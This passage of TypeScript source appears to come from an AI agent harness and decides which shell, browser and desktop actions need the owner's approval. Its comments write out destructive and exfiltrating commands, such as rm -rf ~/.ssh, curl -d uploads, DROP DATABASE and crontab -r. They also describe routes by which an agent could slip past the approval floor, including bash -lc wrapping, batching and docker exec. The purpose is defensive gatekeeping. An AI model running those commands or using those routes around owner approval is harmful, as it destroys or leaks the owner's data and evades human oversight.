     * WHERE IT LANDS, which is the half of the house rule this arm never asked.
     *
     * DESIGN.md:168-175 says a card is owed when the act cannot be taken back by this computer, and
     * defines that as the checkpoint's actual coverage. Measured through this function at bfbbd00,
     * in autonomous: `rm -rf dist`, `rm workspace/tmp.log`, `rmdir build`,
     * `truncate -s 0 server.log`, `find workspace/downloads -name '*.tmp' -delete` and
     * `rm -rf node_modules` ALL stopped the turn, and every one of them is inside
     * `CHECKPOINT_CONTENT` and put straight back by the undo point the same turn had already taken.
     * The owner's own housekeeping task - "clear out the old installers" - cost two cards in every
     * mode for two deletes inside `workspace/downloads`.
     *
     * So the targets are resolved and the card is dropped only when EVERY path the command names
     * is strictly inside a tree a rewind restores. `removalTargets` answers null for every shape it
     * cannot place - a wrapper, a device writer, a delete through a language runtime, an escaping
     * redirect, an unreadable script - and null keeps the card, so this can only ever remove a card
     * from a command whose whole effect it has read.
     *
     * `insideCheckpointContent` carries the reason `strictly` is not `inside the root`:
     * execution.ts puts `HOME` at `.home` beside `workspace/` and not inside it, so `rm -rf ~/.ssh`
     * and `rm -rf ~/.cargo` are inside the container root and inside no checkpoint, and they keep
     * their card.
     *
     * AND A TREE THE CHECKPOINT WALKS IS NOT A TREE IT HOLDS, which is the second way this rule
     * leaked. `CHECKPOINT_CONTENT` names what the scan descends into; two ceilings decide what
     * comes back out. Over `CHECKPOINT_MAX_FILES` - 250,000, config.ts:84 - the scan throws
     * `CheckpointRefusedError` and the turn has no undo point at all, and `#ensureTurnUndoPoint`
     * writes that into the timeline and carries on, which is right for the work and fatal for this
     * rule: every delete inside `workspace/` would be free on a turn nothing can rewind. So the
     * card is dropped only when the caller has said an undo point exists for THIS turn.
     * `context.undoPoint` is that fact and absent keeps the card - @see `ApprovalContext.undoPoint`
     * for why absent is the honest answer on a turn's first call rather than a gap.
     *
     * The second ceiling is `CHECKPOINT_MAX_FILE_BYTES` - 2 GiB, config.ts:87-91 - which makes the
     * scan record a larger file as uncovered and walk past it, so `rm workspace/model.gguf` on a
     * 4 GiB weight file is strictly inside `CHECKPOINT_CONTENT` and is restored by nothing. It rides
     * the same fact, as `context.undoPoint.uncovered`: the paths the walk skipped, carried from the
     * runner's own scan. A delete naming one of them - or a directory above one - keeps its card,
     * and every other delete on the turn stays free. Absent keeps the card on all of them, which is
     * what an old state row, a capped list and a runner one release behind all produce.
     *
     * A set and not a count, and that is the whole reason this took a second field on the wire. A
     * workspace built for model weights or sequencing reads holds an oversize file permanently, so a
     * count would card `rm -rf dist` for the life of that workspace - the friction this rule exists
     * to remove, reinstated on exactly the machines the ceiling exists for.
     *
     * AND A `cd` EARLIER ON THE SAME LINE ANSWERS NOTHING, which is where this rule first leaked.
     * The relative path a command names means whatever the working directory is when it runs, so
     * `cd ~ && rm -rf .ssh` names `.ssh` and removes the agent's own keys. The script spelling is
     * refused inside `removalTargets` by `commandsChangeDirectory`; the decomposed spelling -
     * `env bash -lc '…'`, where this function is handed one command out of a line it never saw -
     * can only be refused by the caller that did the decomposing, which is why `rebased` is a
     * parameter and not something read here.
     */
    const removals = rebased
      ? null
      : removalTargets(
          executable,
          commandArgs,
          commandInterpreters.has(executable) ? commandScript(args) : ''
        );
    const workingDirectory = textValue(args.cwd) || 'workspace';
    const uncovered = context.undoPoint?.uncovered;
    if (
      context.undoPoint?.id &&
      uncovered !== undefined &&
      removals?.every(
        (target) =>
          insideCheckpointContent(target, workingDirectory) &&
          !removesUncoveredFile(target, workingDirectory, uncovered)
      )
    )
      return null;
    /*
     * Its own sentence, because the generic one below is false of it twice over: a move deletes
     * nothing, and "in the workspace" is exactly what this card is raised for NOT being true. What
     * the owner needs told is that the place the file is leaving is outside the rewind's reach.
     */
    if (relocation)
      return {
        action: `Move data out of reach with ${executable}`,
        preview: `Run ${[executable, ...commandArgs].join(' ')}. This empties the place it moves from, and that place is outside the turn's undo point - which covers workspace/ and .athanor/artifacts and nothing else - so rewinding this turn does not put it back. Nothing has to be deleted for this computer to lose the agent's own keys or its shell configuration this way.`
      };
    return {
      action: `Run ${executable}`,
      preview: `Run ${[executable, ...commandArgs].join(' ')} in the workspace. This can remove or overwrite data.`
    };
  };

  /*
   * Every gate below is asked of what the call really runs, not of what launched it.
   *
   * The shell tool's own description tells the model to reach for `bash -lc` the moment it needs a
   * pipe, a glob or a redirect, so most real work arrives wrapped. Only the autonomous network
   * allowlist read the script; the destructive, upload, push and package-install gates each read
   * `args.executable`, so wrapping the identical command removed the card entirely. On a clean turn
   * `bash -lc 'curl -d @workspace/notes.txt https://x'` sent the file with nothing shown to anybody
   * while the bare `curl -d …` stopped - and `context.ts` promises the owner, in the
   * always-resident operating contract, that external submissions and git pushes always stop.
   * `destructiveCommand` was half-converted already: it reads the script through
   * `isDestructiveScript`, which scans for `rm` and for escaping redirects and therefore never saw
   * a wrapped `git reset --hard` or a wrapped `find . -delete`.
   *
   * Shared with `desktop_launch` for the reason the taint half already gives further up this file:
   * both take an executable and arguments and run them on the owner's computer, and the one that is
   * not `shell` runs as the runner's own account rather than as the sandboxed agent. Judging only
   * `shell` here left a card-free duplicate of every command below reachable by asking for a window
   * instead of a pipe.
   */
  const commandRequirement = (): ApprovalRequirement | null => {
    const executable = textValue(args.executable).split('/').pop() ?? '';
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    const invocation = shellInvocation(args);
    /**
     * The three ways this tool puts something where other people have it, each said as itself.
     *
     * One rule and three different things to be asked about, for the reason `registryPublishOperation`
     * is named rather than boolean: a card reading "publishing" over a JSON dump is the shape
     * `approvalToolPhrases` exists to stop, and "this changes what anyone installing this package
     * gets" is simply false of `kubectl apply`. All three are `external_consequential` and above
     * every `securityMode` test, from the same two-part rule: the act cannot be taken back by this
     * computer, and its effect is visible to somebody other than the owner.
     */
    const publishCard = ({
      kind,
      operation
    }: NonNullable<ReturnType<typeof publishingOperation>>): {
      action: string;
      preview: string;
    } => {
      if (kind === 'registry')
        return {
          action: `Publish to a package registry with ${operation}`,
          preview: `Run ${invocation}. This changes what anyone installing this package gets. A version that has reached a public registry cannot be taken back by this computer - npm allows an unpublish for 72 hours and crates.io does not allow one at all - and withdrawing or re-pointing one breaks every build that already resolved it.`
        };
      if (kind === 'publishes')
        return {
          action: `Publish online with ${operation}`,
          preview: `Run ${invocation}. This puts what is here on a hosted service, where anyone with the address can read it. What it replaces is held on that service and not on this computer, so this computer cannot put the previous version back, and anything already fetched from the old one stays fetched.`
        };
      return {
        action: `Change what is deployed with ${operation}`,
        preview: `Run ${invocation}. This changes what is running on infrastructure outside this computer. The state it overwrites lives on that infrastructure, so nothing here can restore it, and whatever depends on the running version sees the change immediately.`
      };
    };
    const commands = effectiveCommands(args);
    const rebased = commandsChangeDirectory(commands);
    /*
     * What each command hands to another box, kept SEPARATE from the commands that run here.
     *
     * `docker exec pg psql -c "DROP DATABASE x"` and `kubectl exec pg -- psql -c "DROP …"` were two
     * of the four shapes DESTRUCTION.md recorded under one sentence - a command that runs another
     * command on the far side of something this file can name - and both were free in balanced and
     * autonomous at 59d3e67, because the walk stops at `docker`.
     *
     * Separate and not merged into `commands`, for the reason `commandCarriedIntoAnotherBox` states
     * at length: the paths in an inner command are the OTHER box's, so every one of them is judged
     * `rebased`, which makes `removalTargets` unplaceable and keeps the card. Merging them would
     * have let `docker exec pg rm -rf dist` resolve `dist` against this machine's `workspace/` and
     * be freed by the location rule for a delete no checkpoint here can undo.
     */
    const carried = commands
      .map((command) => commandCarriedIntoAnotherBox(command))
      .filter((inner): inner is NonNullable<typeof inner> => inner !== null);
    const destructive =
      destructiveCommand(executable, commandArgs) ??
      commands
        .map(([command = '', ...rest]) => destructiveCommand(command, rest, rebased))
        .find(Boolean);
    if (destructive) return { sideEffect: 'external_consequential', ...destructive };
    /*
     * A store this computer does not hold, and work that outlives the turn - the two halves of the
     * autonomous sentence that had no branch.
     *
     * Measured through this function at 89185c6, in balanced AND autonomous: `dropdb production`,
     * `psql -c "DROP DATABASE production"`, `psql -c "TRUNCATE TABLE users"`,
     * `mysql -e "DROP DATABASE app"`, `redis-cli FLUSHALL`, `redis-cli FLUSHDB`,
     * `mongosh --eval 'db.dropDatabase()'`, `sqlite3 app.db "DROP TABLE users"`,
     * `docker volume rm pgdata`, `docker system prune -af --volumes`, `s3cmd del --recursive`,
     * `az storage blob delete-batch`, `crontab /tmp/mycron`, `crontab -r`, `at -f job.sh now`,
     * `systemctl --user enable mysvc` and `launchctl load -w x.plist` ALL raised nothing, while
     * `rm -rf node_modules` - which the turn's undo point puts straight back - stopped the task in
     * all three modes. The contract told the owner in the always-resident text that destroying data
     * and leaving a startup file behind always stop.
     *
     * `external_consequential` and above every `securityMode` test, from the two-part rule the rest
     * of this file's consequential cards are drawn from. The first part is met by construction here
     * rather than argued row by row: `CHECKPOINT_CONTENT` is `workspace` and `.athanor/artifacts`,
     * every operation in `destructionOperation` lands outside both, so the rewind that answers for
     * `rm -rf node_modules` answers for none of these.
     *
     * After `destructiveCommand` and before the publish rule. The first is the more specific
     * statement where both apply - `rm` is `rm` whoever owns the bytes - and no command in either
     * of the two tables below is in the publish tables, measured, so the order between them changes
     * no card either way.
     *
     * `executable` is handed to `scriptDestroysAStore` because the text a command is fed is only
     * evidence once you know what will read it. `commandScript` already joins `args`' inline body
     * to `stdin` - it was written for exactly the walk-past this closes - but the statement it
     * returns for `shell(executable: 'psql', stdin: 'DROP DATABASE production;')` has `drop` as its
     * head, and every client this section knows is on the OUTSIDE of that string. Measured before
     * this argument existed: that call, and the same one on mysql, sqlite3, mongosh and redis-cli,
     * raised nothing in balanced or autonomous, while the same statement typed into `-c` carded in
     * all three.
     */
    const inScript = scriptDestroysAStore(commandScript(args), executable);
    /*
     * The same two questions asked of the inner command, and a third answer when either says yes.
     *
     * `destructionOperation` on the inner tokens finds the store this file already knows how to
     * name - `psql DROP DATABASE`, `redis-cli flushall`, `dropdb` - and `destructiveCommand` with
     * `rebased` forced TRUE finds the deletes, unplaceably, because a path inside a container is
     * not a path this computer checkpoints. The card carries the carrier as well as the operation,
     * so it reads "docker exec psql DROP DATABASE" rather than leaving the owner to work out which
     * machine the statement was going to land on.
     */
    const inAnotherBox = carried
      .map(({ carrier, command }): DestructionOperation | null => {
        const found = destructionOperation(command);
        if (found) return { kind: 'carried', operation: `${carrier} ${found.operation}` };
        const [head = '', ...rest] = command;
        return destructiveCommand(head, rest, true)
          ? { kind: 'carried', operation: `${carrier} ${head}` }
          : null;
      })
      .find(Boolean);
    const destruction =
      commands.map((command) => destructionOperation(command)).find(Boolean) ??
      (commands.length === 0 && commandInterpreters.has(executable)
        ? destructionOperation(commandArgs)
        : null) ??
      (inScript ? ({ kind: 'store', operation: inScript } as const) : null) ??
      inAnotherBox;
    if (destruction)
      return {
        sideEffect: 'external_consequential',
        action:
          destruction.kind === 'store'
            ? `Destroy stored data with ${destruction.operation}`
            : destruction.kind === 'carried'
              ? `Destroy data in another container with ${destruction.operation}`
              : `Install work that outlives this turn with ${destruction.operation}`,
        preview:
          destruction.kind === 'store'
            ? `Run ${invocation}. What this removes is not in the workspace - a database, a cache, a bucket or a container volume all live outside it - so rewinding this turn does not put it back. The turn's undo point covers workspace/ and .athanor/artifacts and nothing else.`
            : destruction.kind === 'carried'
              ? `Run ${invocation}. This carries the command into another container or pod and runs it there. The turn's undo point covers workspace/ and .athanor/artifacts on this computer and nothing on the other side of that boundary, so rewinding this turn leaves whatever it did there done.`
              : `Run ${invocation}. This installs something that runs after this task and every card in it is over, under a process no approval here governs, and it is not inside the turn's undo point either - rewinding this turn leaves it running.`
      };
    /*
     * A version that goes to a registry, which is the one act the owner named and the floor did not
     * have.
     *
     * Measured on this tree before this branch existed: `npm publish`, `pnpm publish`,
     * `yarn publish`, `cargo publish`, `twine upload`, `gem push`, `poetry publish`,
     * `dotnet nuget push`, `mvn deploy` and `docker push` raised NO card in balanced or in
     * autonomous - while `rm -rf node_modules`, which the checkpoint restores, stopped the turn in
     * all three, and `context.ts` told the owner in the always-resident contract that public
     * publishing always stops. `safeNetworkExecutables` is an allowlist of executables, so the
     * allowance written for `npm install` carried `npm publish`; `curl` and `git` had operation
     * checks bolted on and the package managers did not. `registryPublishOperation` is that check.
     *
     * `external_consequential` and above every `securityMode` test, from the two-part rule the rest
     * of this file's consequential cards are drawn from: the act cannot be taken back by this
     * computer - npm's unpublish window is 72 hours and crates.io has none - and its effect is
     * visible to somebody other than the owner. Autonomous is a promise about not interrupting
     * reversible work, and there is no more irreversible act reachable from this tool.
     *
     * Before the install card, deliberately. `npm dist-tag add` and `npm owner add` were reaching
     * that branch on the word `add` and being shown to the owner as "Install or update software
     * with npm" - the right instinct on the wrong evidence, under a sentence that describes the
     * opposite direction of travel.
     *
     * Read through `effectiveCommands` like every gate around it, so `bash -lc 'cd packages/api &&
     * npm publish'` is the same card as the bare form. The extra arm below it is for the one shape
     * `effectiveCommands` returns nothing for: an interpreter handed a script FILE rather than an
     * inline script (`bash ./gradlew publish`), where the tokens after the interpreter are the
     * command and there is no script text to read.
     */
    const publishing =
      commands.map((command) => publishingOperation(command)).find(Boolean) ??
      (commands.length === 0 && commandInterpreters.has(executable)
        ? publishingOperation(commandArgs)
        : null);
    if (publishing) return { sideEffect: 'external_consequential', ...publishCard(publishing) };
    /*
     * `git config` writes `.gitconfig` without ever naming a path, so the deferred-execution rule
     * above - which reads the paths a call writes - cannot see it. It is the likeliest way to write
     * that file and the most dangerous: `core.hooksPath` points every later commit at a directory
     * of the writer's choosing, and an alias is a command git runs under whatever name it is given.
     * Neither shows up as a path token anywhere in the invocation.
     *
     * Reads are exempt by name rather than writes by name, so an option added to git later asks
     * rather than passes - and for the same reason the settings that cannot carry a command are an
     * exemption too, rather than the dangerous ones being a list. Naming the danger would have to
     * name `core.hooksPath`, `alias.*`, `include.path`, `core.pager`, `credential.helper`,
     * `filter.*.clean`, `core.fsmonitor`, `init.templateDir` and whatever git adds next, and would
     * pass every key invented after it was written. Setting a git identity is the first thing
     * anybody does on a fresh box and the first thing this computer's own coding path needs; it was
     * two `external_consequential` cards under a preview describing hooks paths and aliases, which
     * `user.name` cannot possibly carry. `gitConfigRunsCode` holds both halves, and
     * `isMutatingToolCall` reads the same predicate so the floor and the completion clock cannot
     * disagree about what a `git config` did.
     */
    const gitConfigWrite = commands.find(
      ([command = '', ...rest]) => command === 'git' && gitConfigRunsCode(rest)
    );
    if (gitConfigWrite)
      return {
        sideEffect: 'external_consequential',
        action: DEFERRED_EXECUTION_ACTION,
        preview: `Run ${invocation}. git config writes .gitconfig without naming it, and what lands there - core.hooksPath, or an alias - is executed by every later git invocation on this computer, outside any approval this task could raise.`
      };
    const installer = commands.find(
      ([command = '', ...rest]) =>
        packageRemovalExecutables.has(command) &&
        rest.some((argument) => packageInstallCommands.has(argument.toLowerCase()))
    );
    if (installer && SECURITY_MODE_FLOOR[securityMode].asksBeforeInstallingSoftware)
      return {
        sideEffect: 'external_reversible',
        action: `Install or update software with ${installer[0]}`,
        preview: `Run ${invocation} inside the persistent Linux computer. Downloaded software and its publisher terms become part of this installation.`
      };
    /*
     * A forced push before the ordinary one, because the two are not the same act and one card was
     * describing both.
     *
     * Every push already stops - `external_reversible` under "Push Git changes" - and that sentence
     * is true of the ordinary case: what a push adds, a later push can take away, and the commits
     * are still here. A forced push discards commits that exist on a remote this computer does not
     * hold, and nothing here can put them back. This adds no card and moves no count; it changes
     * what the one already there says, and raises it to the class the act belongs to.
     */
    const forced = commands.find((command) => forcedGitPush(command));
    if (forced)
      return {
        sideEffect: 'external_consequential',
        action: 'Overwrite history on a Git remote',
        preview: `Run ${invocation}. A forced push replaces what the remote has rather than adding to it, and the commits it discards live on that remote and not on this computer, so nothing here can put them back. Anyone who already fetched the old history keeps a copy this one no longer agrees with.`
      };
    if (
      commands.some(
        ([command = '', ...rest]) => command === 'git' && gitSubcommand(rest) === 'push'
      )
    )
      return {
        sideEffect: 'external_reversible',
        action: 'Push Git changes',
        preview: `Run ${invocation}`
      };
    const sender = commands.find(([command = '', ...rest]) => sendsDataOverNetwork(command, rest));
    if (sender)
      return {
        sideEffect: 'external_reversible',
        action: `Send data using ${sender[0]}`,
        preview: `Run ${invocation} with outbound network access. This can change an external service or upload workspace data.`
      };
    return null;
  };

  if (name === 'desktop_launch') {
    const requirement = commandRequirement();
    if (requirement) return requirement;
  }

  if (name === 'shell') {
    const executable = textValue(args.executable).split('/').pop() ?? '';
    const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
    const commands = effectiveCommands(args);
    const requirement = commandRequirement();
    if (requirement) return requirement;
    /*
     * WHAT THIS CALL REACHES, NOT WHAT IT DECLARED.
     *
     * Both network branches below used to open on `args.network === true`, and that field decides
     * nothing about the command: `execution.ts` puts a command in its own network namespace only
     * when `policy.isolateNetwork && !request.network`, and `ISOLATE_AGENT_NETWORK` ships false
     * because a namespace of one's own comes with a loopback of one's own and published previews
     * stop answering. So the flag bought no confinement, and the same forty-seven calls of
     * `K-one-shot-app`, on the turn that has read something, with every `network` omitted cost two
     * cards in autonomous instead of six and four in balanced instead of six, with byte-identical
     * access. That is an
     * incentive pointed at silence, in a floor whose whole input is what the model tells it.
     *
     * The declaration therefore stops costing, and what it claimed to stand for is asked of the
     * harness's own address reader instead. `outboundDestinations` is `callDestinations` judged by
     * `classifyDestination` against an empty corpus, so it answers one question - does this request
     * go out on the internet - and loopback, the estate and this box's own origin come back empty.
     * A request to `http://localhost:5173/api/health` no longer asks the owner to allow internet
     * access, which it did while the instrument that cleared it was being consulted in the same
     * call.
     *
     * "The internet" and not "off this computer", and the difference is a decision rather than an
     * accident now that `classifyDestination` can tell them apart. The estate is charged and gated
     * by the provenance arm above, where a turn has read somebody else's instructions; here, on a
     * clean turn, the owner's own machines are the owner's own work. Widening this is one clause in
     * `outboundDestinations` and four rows in `evals/cards` - see docs/design/gaps/NETWORK.md.
     */
    const outbound = outboundDestinations(name, args, context.selfOrigins ?? []);
    /*
     * The third fact, and the one the flag used to answer for by accident: a client whose grammar
     * is "here is where to connect", whose far end this could not read because a substitution ate
     * it. See `reachesAnUnreadableFarEnd`. Kept out of `outbound` rather than folded into it,
     * because the card below names hosts and this case has none to name - an arm that pretended
     * otherwise would print a destination for a request whose destination is exactly what nobody
     * has.
     */
    const unreadable = reachesAnUnreadableFarEnd(args);
    // The fact both arms below are about, named once: this call goes somewhere off this computer,
    // whether or not the harness could read where.
    const reachesOutside = outbound.length > 0 || unreadable;
    if (reachesOutside && !SECURITY_MODE_FLOOR[securityMode].asksBeforeReachingTheInternet) {
      /**
       * The allowlist judges what the command really runs, not what launched it. An interpreter is
       * never on the list and never can be - `bash` is not a network client, it is whatever the
       * script says - so the question is asked of each command the script names instead: on the
       * list, or a segment with no socket in it. A script naming anything else, and a script this
       * cannot read at all, both keep their card - unknown fails closed, which is why the empty
       * case is checked separately.
       *
       * `noEgressExecutables` is the repair to the inversion this arm shipped. The question it asks
       * is "is every command here a known-safe network client", and it was asked of every segment,
       * so `cd app && npm install express` carded as "Review network access for cd" while
       * `curl -sS https://example.com -o data.json` was free - nine of fourteen idiomatic install
       * lines, on a clean turn, backwards on blast radius. Two changes put it right: the arm only
       * opens when an address really leaves the computer, and a segment that opens no socket is not
       * asked to be a network client. The escalating cases - an upload, a push, a destructive
       * command - are caught one rule earlier by `commandRequirement()` in every mode, so they are
       * no longer restated here where only autonomous would have read them.
       */
      const unlisted = commands.find(
        ([command = '']) =>
          !(
            noEgressExecutables.has(command) ||
            safeNetworkExecutables.has(command) ||
            command === 'gh'
          )
      );
      if (unlisted || commands.length === 0)
        return {
          sideEffect: 'external_reversible',
          action: `Review network access for ${unlisted?.[0] || executable || 'command'}`,
          preview: `Run ${[executable, ...commandArgs].join(' ')}. It reaches ${outbound.length ? namedObjects([...new Set(outbound.map(({ host }) => host))]) : 'an address this could not read'}, and ${unlisted ? `it runs ${unlisted[0]}, which is not read-only or package-install use of the allowlist.` : 'what it runs could not be read, so its network use is unknown.'}`
        };
    }
    if (reachesOutside && SECURITY_MODE_FLOOR[securityMode].asksBeforeReachingTheInternet)
      return {
        sideEffect: 'external_reversible',
        action: `Allow internet access for ${executable || 'command'}`,
        // This used to promise that the default shell is network-isolated. The installer ships that
        // setting off, because a command in its own network namespace also has its own loopback and
        // published previews stop working - so the card was telling the owner a confinement was in
        // place that was not. Describe only what approving this actually does, and name where.
        preview: outbound.length
          ? `Run ${[executable, ...commandArgs].join(' ')}. It reaches ${namedObjects([...new Set(outbound.map(({ host }) => host))])}, which is outside this computer, so it can send data out.`
          : `Run ${[executable, ...commandArgs].join(' ')}. It connects to somewhere this computer could not read out of the command, so where it sends data is unknown.`
      };
  }
  /*
   * Ahead of the `asksBeforeEveryChange` row further down, which is what makes that row's private
   * wording true: a public reach returns here first, in every mode, so the "Create a private
   * preview" card below can only ever be answered about a private one.
   */
  if (publishReachOfCall(name, args) === 'public') {
    const label = textValue(args.label, 'App');
    const port = textValue(args.port, 'unknown');
    return {
      sideEffect: 'external_consequential',
      action: `Publish ${label} publicly`,
      preview: `Expose workspace port ${port} at a persistent public URL. Anyone with the URL can access the app until it is unpublished or revoked, and the URL answers only while something is still listening on that port.`
    };
  }
  if (name === 'browser_action') {
    // The action name is a sibling of the fields rather than the tag on a nested object, because
    // the twenty-variant union that shape came from cost about five kilobytes of every request.
    // Every gate below reads the same fields it always read; only where the verb is written moved.
    const action = surfaceActionVerb(args);
    // Still read as evidence for the consequential-text gate below, where it may only ever raise
    // the floor, and no longer written into the headline the owner answers.
    const purpose = textValue(args.purpose);
    const reason = statedReason(args.purpose);
    // A batch is twenty-four actions wearing one name. Judging it on that name let the whole
    // approval floor be stepped around by wrapping the submit click, the upload or the Enter press
    // in a batch with the fields it follows - so every step is judged as the action it is, and the
    // strongest requirement any of them raises is the one the owner answers.
    if (action === 'batch') {
      const steps = Array.isArray(args.actions) ? args.actions : [];
      let strongest: ApprovalRequirement | null = null;
      steps.forEach((step, index) => {
        const bag = (step && typeof step === 'object' ? step : {}) as Record<string, unknown>;
        const type = surfaceActionVerb(bag);
        // The runner's own union has no nested batch; refusing to descend keeps this bounded
        // whatever arrives.
        if (!type || type === 'batch') return;
        // The provenance half is deliberately not re-run per step: it already judged every address
        // in the batch at once, and asking it again here would show the owner the same destination
        // twice on one card.
        const requirement = ordinaryRequirement(
          name,
          { ...bag, purpose: args.purpose },
          securityMode,
          {}
        );
        if (!requirement) return;
        if (
          strongest &&
          APPROVAL_RANK[strongest.sideEffect] >= APPROVAL_RANK[requirement.sideEffect]
        )
          return;
        strongest = {
          ...requirement,
          // The step's verb through the same shape gate as the review card's, so one line of the
          // preview cannot be a sentence a page wrote: `type` here is `bag.action`, and a batch
          // step's bag is as model-written as the call around it.
          preview: `Step ${index + 1} of ${steps.length} in this batch (${surfaceVerbName(bag) || 'unnamed'}):\n${requirement.preview}`
        };
      });
      if (strongest) return strongest;
    }
    if (action === 'upload') {
      const paths = Array.isArray(args.paths) ? args.paths.map(String) : [];
      // The runner refuses an unapproved upload, so asking here is what makes uploads work at
      // all — and sending a workspace file to an outside site is worth a look regardless.
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Send ${paths.join(', ') || 'workspace files'} to this website.\n${reason}`
      };
    }
    if (action === 'click_at') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
      };
    }
    if (action === 'press' && textValue(args.key).toLowerCase() === 'enter') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Pressing Enter can submit the focused form.\n${reason}`
      };
    }
    if (action === 'dialog' && args.response === 'accept') {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `${
          args.promptText
            ? 'The dialog requests private text, so the user must take over secure input.'
            : 'Accepting a page confirmation can trigger an external action.'
        }\n${reason}`
      };
    }
    if (
      (action === 'click' || action === 'double_click') &&
      consequentialText.test(`${textValue(args.selector)} ${purpose}`)
    ) {
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Selector: ${textValue(args.selector, 'unknown')}\n${reason}`
      };
    }
  }
  if (name === 'desktop_action') {
    const action = surfaceActionVerb(args);
    const purpose = textValue(args.purpose);
    const reason = statedReason(args.purpose);
    if (action === 'click_at' || action === 'drag')
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Coordinate clicks are ambiguous and always require confirmation.\n${reason}`
      };
    if (action === 'press' && textValue(args.key).toLowerCase() === 'enter')
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Pressing Enter can submit the focused desktop control.\n${reason}`
      };
    if (action === 'invoke' && consequentialText.test(`${textValue(args.nodeId)} ${purpose}`))
      return {
        sideEffect: 'external_consequential',
        action: surfaceHeadline(name, action),
        preview: `Accessibility node: ${textValue(args.nodeId, 'unknown')}\n${reason}`
      };
  }
  if (name === 'connector_action') {
    const action = textValue(args.action);
    const definition = connectorActions[action as keyof typeof connectorActions];
    if (definition?.sideEffect === 'read') return null;
    if (definition?.sideEffect === 'delete' || definition?.sideEffect === 'write')
      return {
        sideEffect:
          definition.sideEffect === 'delete' ? 'external_consequential' : 'external_reversible',
        ...connectorApprovalCard(
          action,
          (args.input && typeof args.input === 'object' ? args.input : {}) as Record<
            string,
            unknown
          >
        )
      };
  }
  if (SECURITY_MODE_FLOOR[securityMode].asksBeforeEveryChange) {
    if (name === 'shell')
      return {
        sideEffect: 'workspace_write',
        action: 'Run a command on this computer',
        // Through the same reader as every other card that prints a command, so the script handed
        // over on stdin is shown here too. It read `[executable, ...args]`, which is "Run bash" for
        // the one shape where the command is entirely in `stdin` - a card, in the mode that exists
        // to show commands, describing a command it did not show.
        preview: `Run ${shellInvocation(args) || 'command'}`
      };
    /*
     * The paths, because the paths are already in the call.
     *
     * This card read "Apply 3 conflict-checked file patch(es)" and named none of them, so Review
     * mode - the mode whose whole promise is that the owner sees a change before it lands - asked
     * for approval of an edit without saying what it edits. `file_patch` keeps `path` as a
     * top-level field of every patch rather than as a header inside the edit body PRECISELY so that
     * this card can read it (tool-catalogue.ts says so in as many words), and the card did not read
     * it. Nothing new was needed: `writtenPaths` is the same reader the deferred-execution rule
     * above and the durable-instruction rule use, so the three cannot disagree about which files a
     * call writes.
     */
    if (name === 'file_write' || name === 'file_patch' || name === 'print_pdf') {
      const patched = namedObjects(writtenPaths(name, args));
      return {
        sideEffect: 'workspace_write',
        action: 'Change a workspace file',
        preview:
          name === 'file_patch'
            ? `Apply ${Array.isArray(args.patches) ? args.patches.length : 0} conflict-checked file patch(es) to ${patched || 'a workspace file'}`
            : name === 'print_pdf'
              ? `Print the current page to ${textValue(args.path, 'a workspace PDF')}`
              : `Create or replace ${textValue(args.path, 'a workspace file')}`
      };
    }
    /*
     * The private reach, spelled as a reach and not as a name, so this row cannot be made wrong by
     * being moved. A public publish is answered on the ordinary path above and never arrives here;
     * writing `name === 'publish_preview'` would leave a row headed "Create a private preview" that
     * is only true because of where it sits in the function, which is the kind of correctness that
     * survives exactly until somebody reorders the branches.
     */
    if (
      name === 'publish_artifact' ||
      publishReachOfCall(name, args) === 'private' ||
      name === 'desktop_launch'
    )
      return {
        sideEffect: 'workspace_write',
        action:
          name === 'desktop_launch'
            ? 'Launch a desktop application'
            : name === 'publish_preview'
              ? 'Create a private preview'
              : 'Publish a file to the chat',
        preview:
          name === 'desktop_launch'
            ? `Launch ${textValue(args.executable, 'an application')} on this computer`
            : `Use ${textValue(args.path, textValue(args.label, 'workspace output'))}`
      };
    if (name === 'browser_action' || name === 'desktop_action') {
      const verb = surfaceVerbName(args);
      if (
        !['focus', 'hover', 'scroll', 'reload', 'back', 'go_back', 'navigate'].includes(
          surfaceActionVerb(args)
        )
      )
        return {
          sideEffect: 'workspace_write',
          action: `Review ${name === 'browser_action' ? 'a browser' : 'a desktop'} action`,
          // The verb, which is the one thing the owner needs and the card did not say: a `type`
          // and a `click` arrived under the same sentence with nothing to tell them apart. It goes
          // in the preview and not in the headline, and the selector, the node id and the typed
          // text stay out of both - the closed vocabulary above says why, and a batch already
          // names its step's verb here for the same reason.
          preview: `Review mode asks before each form or application change, and this one is ${verb || 'unnamed'}.\n${statedReason(args.purpose)}`
        };
    }
  }
  return null;
};
